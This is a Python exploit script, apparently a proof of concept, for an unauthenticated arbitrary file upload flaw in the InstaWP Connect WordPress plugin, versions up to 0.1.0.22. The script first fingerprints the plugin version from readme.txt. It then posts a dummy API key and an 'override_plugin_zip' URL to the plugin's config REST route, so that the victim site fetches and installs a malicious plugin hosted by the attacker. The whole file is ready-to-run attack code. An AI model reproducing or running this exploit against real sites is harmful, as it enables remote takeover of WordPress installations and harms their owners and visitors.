import argparse
import requests
from urllib.parse import urlparse

#by Nxploit Khaled_alenazi


def validate_url(url):
    """Ensure the URL has a proper scheme (http/https)."""
    parsed_url = urlparse(url)
    if not parsed_url.scheme:
        url = f"http://{url}"
    return url

def check_version(url):
    """Check the version of the plugin from readme.txt."""
    try:
        readme_url = f"{url}wp-content/plugins/instawp-connect/readme.txt"
        response = requests.get(readme_url, timeout=10)
        if response.status_code == 200:
            content = response.text
            if "Stable tag:" in content:
                for line in content.splitlines():
                    if "Stable tag:" in line:
                        version = line.split(":")[1].strip()
                        print(f"Detected version: {version}")
                        if version <= "0.1.0.22":
                            print("The site is vulnerable.")
                        else:
                            print("The site is not vulnerable.")
                        return
            print("Could not find the version information in readme.txt.")
        else:
            print(f"Failed to fetch readme.txt. Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while checking the version: {e}")

def main():
    parser = argparse.ArgumentParser(description="The InstaWP Connect â€“ 1-click WP Staging & Migration plugin for WordPress is vulnerable to arbitrary file uploads due\nto insufficient file validation in the /wp-json/instawp-connect/v1/config REST API endpoint in all versions up to, and\nincluding, 0.1.0.22. This makes it possible for unauthenticated attackers to upload arbitrary files")
    parser.add_argument("-up", "--url_plugin", required=True, help="URL of the plugin (e.g., http://attacker-domain/malicious-plugin.zip).")
    parser.add_argument("-u", "--url_target", required=True, help="URL of the target WordPress site (e.g., http://victim-domain/).")
    args = parser.parse_args()

    url_plugin = validate_url(args.url_plugin.strip())
    url_target = validate_url(args.url_target.strip())

    print(f"Plugin URL: {url_plugin}")
    print(f"Target URL: {url_target}")

    check_version(url_target)

    data = {
        "api_key": "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
        "override_plugin_zip": url_plugin
    }

    url = f"{url_target}?rest_route=/instawp-connect/v1/config"

    try:
        response = requests.post(url, data=data, timeout=10)

        if response.status_code == 200:
            try:
                print("Response:")
                print(response.json())  # Print the response in JSON format
            except ValueError as e:
                print("Error parsing JSON:", e)
        else:
            print(f"Request failed with status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while sending the request: {e}")

if __name__ == "__main__":
    main()
